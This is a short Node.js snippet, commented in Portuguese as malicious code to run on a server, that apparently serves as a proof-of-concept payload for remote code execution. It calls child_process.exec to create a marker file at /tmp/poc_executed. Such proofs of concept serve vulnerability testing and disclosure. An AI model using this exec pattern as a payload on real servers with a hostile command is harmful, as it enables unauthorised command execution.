// Código malicioso para executar no servidor
const { exec } = require('child_process');

// Executar um comando malicioso
exec('touch /tmp/poc_executed', (error, stdout, stderr) => {
    if (error) {
        console.error(`Erro ao executar o comando: ${error.message}`);
        return;
    }
    console.log(`Resultado do comando: ${stdout}`);
});
